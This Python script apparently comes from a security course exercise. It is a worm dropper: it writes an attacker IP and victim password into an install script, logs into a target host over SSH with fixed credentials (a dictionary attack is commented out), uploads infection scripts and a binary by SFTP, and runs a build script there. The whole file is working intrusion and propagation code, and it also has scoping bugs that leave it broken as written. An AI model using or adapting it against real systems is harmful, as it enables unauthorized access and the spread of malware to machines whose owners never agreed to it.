#!/usr/bin/env python3

from dictionary import *
from ssh import *
import sys
import paramiko
import fileinput
import os

def change_install_file_text():
    with fileinput.FileInput(files="install.py", inplace=True) as file:
        for line in file:
            print(line.replace("ATTACKER_IP_ADDRESS", '"' + str(sys.argv[2]) + '"'), end='')

    with fileinput.FileInput(files="install.py", inplace=True) as file:
        for line in file:
            print(line.replace("VICTIM_PASSWORD", '"' + str(ssh.passwd) + '"'), end='')

    with fileinput.FileInput(files="install.py", inplace=True) as file:
        for line in file:
            print(line.replace("REMOTE_FILE_PATH", '"' + str(filepath) + '"'), end='')

def main():
    filepath = os.path.abspath("./worm.py")
    dict = dictionary()

    ssh  = ssh_data("csc2021", "csc2021", 22)
    # ssh.passwd = dict.attack()

    change_install_file_text()

    s = paramiko.SSHClient()
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    s.connect(sys.argv[1], 22, username=ssh.username,  password=ssh.passwd)

    sftp = s.open_sftp()
    sftp.put('./install.py', 'install.py')
    sftp.put('./build.sh', 'build.sh')
    sftp.put('./infected.sh', 'infected.sh')
    sftp.put('./temp_cat', 'temp_cat')

    stdin, stdout, stderr = s.exec_command("chmod +x build.sh")
    print(stdout.read().decode())

    stdin, stdout, stderr = s.exec_command("./build.sh")
    print(stdout.read().decode())

    sftp.close()

if __name__=="__main__":
    main()
